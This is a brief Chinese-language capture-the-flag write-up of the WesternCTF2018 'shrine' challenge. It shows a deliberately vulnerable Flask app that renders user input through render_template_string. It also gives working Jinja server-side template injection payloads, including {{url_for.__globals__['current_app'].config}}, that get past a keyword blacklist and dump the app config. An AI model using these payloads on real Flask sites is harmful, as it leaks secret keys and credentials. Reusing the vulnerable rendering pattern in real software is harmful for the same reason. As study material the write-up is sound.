# [WesternCTF2018]shrine（学习）
![](<./img/Pasted image 20221129143404.png>)

---
首页长这样
```python
import flask
import os

app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
	return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
	def safe_jinja(s):
		s = s.replace('(', '').replace(')', '')
		blacklist = ['config', 'self']
		return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

	return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
	app.run(debug=True)
```
显然是个`flask`的`SSTI`

```php
/shrine/{{1+1}}
```
> 2

`flag`保存在app.config里，所以只要访问`/shrine/{{config}}`就可以了啊哈哈（
```python
blacklist = ['config', 'self']
return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
```
并不行，这俩被替换成`None`了

网上给出的解决方案是利用`flask`的`url_for`函数以及`python`的`__globals__`魔法，获取`url_for`所在环境中的全局变量
```python
/shrine/{{url_for.__globals__}}
```
![](<./img/Pasted image 20221129160253.png>)

```python
/shrine/{{url_for.__globals__['current_app'].config}}
```

![](<./img/Pasted image 20221129160733.png>)

#Web #python #flask #SSTI #urlfor #globals #bypass 